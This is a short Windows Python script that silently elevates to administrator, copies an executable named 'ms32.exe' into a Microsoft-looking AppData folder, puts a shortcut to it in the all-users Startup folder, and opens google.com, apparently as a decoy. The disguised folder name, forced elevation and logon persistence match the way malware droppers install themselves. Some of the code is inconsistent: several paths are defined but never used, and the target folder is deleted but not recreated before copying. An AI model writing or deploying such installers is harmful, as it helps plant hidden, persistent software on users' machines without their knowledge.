import os
import shutil
import sys
import ctypes
from elevate import elevate
from webbrowser import open as open_t

# Check if the script is running with administrator privileges (Windows version)
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return False

# If the script is not running as administrator, elevate it
if not is_admin():
    elevate()  # This will re-run the script with administrator privileges

# Source file paths
source_path_exe = 'ms32.exe'
source_folder = 'effects'
source_updater = 'updater.exe'
source_shortcut = "ms32.lnk"

# Expand environment variables in the paths
appdata_path = os.path.expandvars(r"%APPDATA%\Microsoft\MS32")
destination_path_exe = os.path.join(appdata_path, 'ms32.exe')
destination_folder = os.path.join(appdata_path, 'effects')
destination_updater = os.path.join(appdata_path, 'updater.exe')
destination_shortcut = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ms32.lnk"
if os.path.exists(appdata_path):
    shutil.rmtree(appdata_path)
try:
    # Copy the ms32.exe file
    shutil.copy(source_path_exe, destination_path_exe)
    print(f"File copied from {source_path_exe} to {destination_path_exe}")

    # Copy the shortcut file
    shutil.copy(source_shortcut, destination_shortcut)
    print(f"File copied from {source_shortcut} to {destination_shortcut}")
    
    open_t("https://google.com")

except FileNotFoundError as e:
    print(f"Error: Source file or folder not found.")
    print(f"Details: {e}")

except PermissionError as e:
    print(f"Error: Permission denied while accessing the destination.")
    print(f"Details: {e}")

except Exception as e:
    print(f"An unexpected error occurred: {e}")
